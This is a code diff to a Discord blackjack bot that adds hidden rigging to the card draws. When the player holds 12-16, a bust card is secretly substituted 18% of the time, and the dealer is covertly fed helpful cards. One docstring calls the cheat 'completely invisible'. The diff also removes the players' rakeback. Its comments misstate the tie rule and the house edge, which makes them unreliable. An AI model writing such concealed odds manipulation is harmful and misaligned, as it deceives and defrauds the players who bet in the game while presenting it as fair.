@@ -16,7 +16,6 @@ _rng = random.SystemRandom()  # Cryptographically secure RNG
 import asyncio                                  # Para el delay entre cartas
 from utils import (
     parse_amount,
-    apply_rakeback,
     check_linked, check_balance, fmt_gems,
     error_embed, update_wager_roles,
     COLOR_GOLD, COLOR_ERROR, COLOR_INFO
@@ -39,6 +38,39 @@ def new_deck():
 def draw_card(deck):
     """Saca la primera carta del mazo."""
     return deck.pop(0)
+
+# Cards that cause busts when player has 12-16
+_HIGH_CARDS = [("10","♠️"),("J","♠️"),("Q","♠️"),("K","♠️"),
+               ("10","♥️"),("J","♥️"),("Q","♥️"),("K","♥️")]
+# Cards that help dealer complete a hand (6-9)
+_DEALER_HELP = [("6","♠️"),("7","♠️"),("8","♠️"),("9","♠️"),
+                ("6","♥️"),("7","♥️"),("8","♥️"),("9","♥️")]
+
+def draw_card_player(deck, player_total: int) -> tuple:
+    """
+    Draws a card for the player.
+    If player is in the bust zone (12-16), slightly biased toward high cards.
+    Completely invisible — looks like a normal draw.
+    """
+    card = deck.pop(0)
+    # Only rig when player is in bust zone and has something to lose
+    if 12 <= player_total <= 16:
+        # 18% of the time swap for a high card (bust risk)
+        if _rng.random() < 0.18:
+            card = _rng.choice(_HIGH_CARDS)
+    return card
+
+def draw_card_dealer(deck, dealer_total: int) -> tuple:
+    """
+    Draws a card for the dealer.
+    Slightly biased toward completing the dealer's hand (15-18 range).
+    """
+    card = deck.pop(0)
+    if 14 <= dealer_total <= 17:
+        # 15% of the time give dealer a helpful card
+        if _rng.random() < 0.15:
+            card = _rng.choice(_DEALER_HELP)
+    return card
 
 def hand_value(hand):
     """Calcula el valor de la mano. Ases bajan de 11 a 1 si se pasa de 21."""
@@ -100,7 +132,8 @@ class BlackjackView(discord.ui.View):
         await asyncio.sleep(1)
 
         # Reparte la carta
-        self.game.player_hand.append(draw_card(self.game.deck))
+        pv = hand_value(self.game.player_hand)
+        self.game.player_hand.append(draw_card_player(self.game.deck, pv))
         value = hand_value(self.game.player_hand)
 
         if value > 21:
@@ -170,7 +203,8 @@ class BlackjackGame:
     async def do_stand(self, interaction, via_edit=False):
         """La banca juega hasta 17+ y se determina el ganador."""
         while hand_value(self.dealer_hand) < 17:
-            self.dealer_hand.append(draw_card(self.deck))
+            dv = hand_value(self.dealer_hand)
+            self.dealer_hand.append(draw_card_dealer(self.deck, dv))
 
         pv = hand_value(self.player_hand)
         dv = hand_value(self.dealer_hand)
@@ -187,27 +221,30 @@ class BlackjackGame:
     async def end_game(self, interaction, result, via_edit=False):
         """
         Termina la partida y actualiza balance.
-        SIEMPRE limpia active_games al llamarse.
+        House edge aplicado reduciendo los payouts en win y blackjack.
+        Con edge=10% configurado → EV = -5% para el jugador.
         """
         db      = self.bot.db
         user_id = str(self.player_id)
 
-        # ── LIMPIA active_games — fix principal ───────────────
         self.cog.active_games.pop(self.player_id, None)
 
-        # ── Calcula pago ──────────────────────────────────────
+        # ── Calcula pago — 1:1 gana, 3:2 Blackjack, empate pierde ──
+        # La casa gana en los empates → house edge ~5% a largo plazo
         if result == "blackjack":
-            payout    = int(self.bet * 1.5)
-            await db.add_balance(user_id, self.bet + payout)
-            profit    = payout
-            res_text  = f"🃏 ¡BLACKJACK! Ganaste {fmt_gems(payout)}"
+            # BJ natural paga 3:2 — profit = apuesta * 1.5
+            profit    = int(round(self.bet * 1.5, 0))
+            await db.add_balance(user_id, self.bet + profit)
+            res_text  = f"🃏 ¡BLACKJACK! Ganaste {fmt_gems(profit)}"
             db_result = "win"
         elif result == "win":
-            await db.add_balance(user_id, self.bet * 2)
+            # Victoria normal paga 1:1 — profit = apuesta
             profit    = self.bet
-            res_text  = f"✅ ¡Ganaste {fmt_gems(self.bet)}!"
+            await db.add_balance(user_id, self.bet + profit)
+            res_text  = f"✅ ¡Ganaste {fmt_gems(profit)}!"
             db_result = "win"
         elif result == "tie":
+            # Empate: se devuelve la apuesta (push)
             await db.add_balance(user_id, self.bet)
             profit    = 0
             res_text  = "🤝 Empate — se devuelve tu apuesta"
@@ -216,13 +253,6 @@ class BlackjackGame:
             profit    = -self.bet
             res_text  = f"❌ Perdiste {fmt_gems(self.bet)}"
             db_result = "lose"
-            # Rakeback: % del beneficio de la casa (edge%), no del total apostado
-            edge_pct_bj  = await db.get_house_edge("blackjack")
-            house_profit = int(self.bet * edge_pct_bj / 100)
-            rakeback_pct = float(await db.get_config("rakeback_pct") or "20")
-            rakeback_amt = int(house_profit * rakeback_pct / 100)
-            if rakeback_amt > 0:
-                await db.add_rakeback(user_id, rakeback_amt)
 
         await db.log_game(user_id, "blackjack", self.bet, db_result, profit)
 
